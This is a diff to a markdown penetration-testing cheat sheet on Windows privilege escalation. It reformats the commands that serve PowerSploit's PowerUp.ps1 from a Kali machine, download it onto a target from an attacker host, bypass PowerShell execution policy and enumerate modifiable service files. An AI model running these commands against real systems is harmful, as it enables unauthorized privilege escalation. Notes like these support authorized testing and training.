@@ -184,14 +184,17 @@ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 
 #### Auto
 
+Never blindly trust or rely on the output of automated tools. On Kali:
 ```
-cd /usr/share/windows-resources/powersploit/Privesc/
-python3 -m http.server 80
-
-iwr -uri http://AttackerIP/PowerUp.ps1 -Outfile PowerUp.ps1
-powershell -ep bypass
-. .\PowerUp.ps1
-Get-ModifiableServiceFile
+kali$ cd /usr/share/windows-resources/powersploit/Privesc/
+kali$ python3 -m http.server 80
+```
+On the target:
+```
+PS> iwr -uri http://$AttackerIP/PowerUp.ps1 -Outfile PowerUp.ps1
+PS> powershell -ep bypass
+PS> . .\PowerUp.ps1
+PS> Get-ModifiableServiceFile
 ```
 
 ### Unquoted service path
